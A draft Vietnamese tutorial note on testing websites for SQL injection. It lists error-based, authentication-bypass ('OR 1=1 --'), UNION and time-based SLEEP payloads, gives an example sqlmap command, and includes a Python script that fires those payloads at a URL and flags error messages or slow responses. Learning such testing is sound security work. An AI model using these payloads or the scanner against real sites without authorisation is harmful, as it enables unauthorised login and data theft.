---
title: 🌱 Check SQL Injection
tags:
  - til
date: 2025-03-11
aliases: 
draft: true
---
## **🔍 1. Kiểm tra các điểm nhập dữ liệu**

Trước tiên, xác định các điểm trên trang web có thể tương tác với cơ sở dữ liệu, chẳng hạn như:

- **Form đăng nhập** (username/password)
- **Thanh tìm kiếm**
- **Trường nhập dữ liệu của người dùng** (comment, review, đăng ký)
- **Tham số URL** (`?id=123`, `?product=5`)

---

## **🛠 2. Kiểm tra thủ công bằng Payload SQL Injection**

Thử nhập các payload SQL vào các trường nhập hoặc tham số URL để kiểm tra phản hồi của trang web.

### **📌 a) Payload kiểm tra lỗi (Error-based SQLi)**

Nếu trang web chưa được bảo vệ tốt, nó có thể hiển thị lỗi SQL khi nhập các ký tự đặc biệt.

#### **📍 Thử nhập vào các trường nhập hoặc URL:**

sql

CopyEdit

``' "  ` ' OR 1=1 -- " OR 1=1 -- admin' --``

#### **📍 Ví dụ với URL:**

```
https://example.com/product.php?id=1'
```

✅ Nếu trang web trả về **lỗi SQL** như:


```
You have an error in your SQL syntax...
```

🔴 **Trang web có thể dễ bị SQL Injection**.

---

### **📌 b) Payload kiểm tra xác thực (Authentication Bypass)**

Nếu trang có đăng nhập, thử đăng nhập với:

```sql
' OR 1=1 -- " OR 1=1 -- admin' -- admin" --
```

✅ Nếu bạn đăng nhập mà **không cần mật khẩu**, trang web có thể bị SQL Injection.

---

### **📌 c) Payload kiểm tra UNION-based SQL Injection**

Thử **kết hợp câu lệnh UNION** để xem có thể lấy dữ liệu từ database không:

```sql
1' UNION SELECT null, null, null --
```

Nếu trang phản hồi với lỗi hoặc hiển thị thêm dữ liệu, SQL Injection có thể hoạt động.

---

### **📌 d) Payload kiểm tra Blind SQL Injection**

Nếu trang không hiển thị lỗi nhưng vẫn có lỗ hổng SQL Injection, bạn có thể thử **Blind SQLi** bằng cách kiểm tra phản hồi chậm:

```sql
1' AND SLEEP(5) --
```

✅ Nếu trang phản hồi **chậm hơn 5 giây**, trang có thể bị SQL Injection.

---

## **🛡 3. Sử dụng công cụ tự động kiểm tra**

Nếu bạn muốn tự động kiểm tra, có thể dùng các công cụ:

### ✅ **a) `sqlmap` (Dành cho Pentest)**

`sqlmap` là công cụ mạnh mẽ để kiểm tra SQL Injection trên các trang web.

```bash
sqlmap -u "https://example.com/product.php?id=1" --dbs
```

✅ Nếu tìm thấy lỗ hổng, `sqlmap` sẽ hiển thị thông tin về cơ sở dữ liệu.
### ✅ **b) Burp Suite**
- Sử dụng Burp Suite để kiểm tra request/response của trang web.
- Chèn payload SQL và kiểm tra phản hồi của server.

# Tools Python

```python
import requests

# Danh sách payload để kiểm tra SQL Injection
sql_payloads = [
    "'", "\"", "`", " OR 1=1 --", " OR '1'='1' --", " OR \"1\"=\"1\" --", " OR `1`=`1` --",
    "' UNION SELECT null, null, null --", "\" UNION SELECT null, null, null --",
    "' AND SLEEP(5) --", "\" AND SLEEP(5) --", "1' AND SLEEP(5) --", "1\" AND SLEEP(5) --"
]

# Hàm kiểm tra SQL Injection
def check_sql_injection(url):
    results = []

    for payload in sql_payloads:
        test_url = url.replace("=", f"={payload}")  # Thay thế tham số với payload
        try:
            response = requests.get(test_url, timeout=10)
            content = response.text.lower()

            # Kiểm tra các lỗi SQL phổ biến trong phản hồi
            error_signatures = ["sql syntax", "mysql_fetch", "mysql_num_rows", "sqlstate", "syntax error"]
            vulnerable = any(error in content for error in error_signatures)

            # Nếu trang phản hồi chậm hơn 5 giây, có thể bị Blind SQLi
            slow_response = response.elapsed.total_seconds() > 5

            if vulnerable or slow_response:
                results.append((test_url, "Possibly Vulnerable" if vulnerable else "Slow Response (Blind SQLi)"))
        
        except requests.exceptions.RequestException:
            results.append((test_url, "Request Failed"))

    return results

# Ghi kết quả vào file để tải xuống
url_to_test = "https://example.com/product.php?id=1"  # Thay URL cần kiểm tra
scan_results = check_sql_injection(url_to_test)

# Lưu kết quả vào file
output_file = "/mnt/data/sql_injection_results.txt"
with open(output_file, "w") as f:
    for url, status in scan_results:
        f.write(f"{url} -> {status}\n")

# Xuất đường dẫn file kết quả
output_file
```